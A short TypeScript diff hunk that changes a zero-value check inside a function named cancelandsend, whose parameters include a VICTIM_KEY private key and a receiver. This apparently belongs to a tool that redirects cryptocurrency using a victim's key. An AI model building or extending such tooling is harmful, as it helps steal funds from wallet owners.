@@ -1197,7 +1197,7 @@ async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string
  request.log.info('Value is:'+valuee);
  var balance = ethers.BigNumber.from(valuee); // value to be sent by the previous transaction
 
-  if (ethers.BigNumber.from(balance).lte(0)) {
+  if (ethers.BigNumber.from(valuee).lte(0)) {
     request.log.info(`Value is zero`);
     return;
   }
